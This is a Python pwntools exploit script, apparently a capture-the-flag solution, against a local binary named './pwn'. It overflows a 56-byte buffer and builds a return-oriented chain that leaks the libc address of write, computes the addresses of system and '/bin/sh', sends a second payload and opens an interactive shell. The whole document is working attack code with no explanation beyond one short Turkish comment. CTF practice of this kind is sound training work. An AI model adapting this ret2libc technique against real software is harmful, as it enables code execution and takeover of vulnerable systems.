#!/usr/bin/env python
from pwn import *

p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

pop_rdi = p64(0x0000000000400703)
pop_rsi = p64(0x0000000000400701)
write_got = p64(elf.got['write'])
write_plt = p64(elf.plt['write'])
main_fnc = p64(elf.symbols['main'])

payload = 'A'*56
payload += pop_rdi
payload += p64(1) #stdout
payload += pop_rsi #set edilen size, kodun akisini bozmamasi icin, junk data
payload += write_got
payload += p64(0)
payload += write_plt
payload += main_fnc

p.recvuntil('Tell me a story: \n')
p.sendline(payload)
libc_base = u64(p.recv(6).ljust(8, '\0')) - libc.symbols['write']

system = libc_base + libc.symbols["system"]
bin_sh = libc_base + libc.search("/bin/sh\x00").next()

p.recvuntil('Tell me a story: \n')
payload = 'A' * 56 + pop_rdi + p64(bin_sh) + p64(system)
p.sendline(payload)

p.interactive()
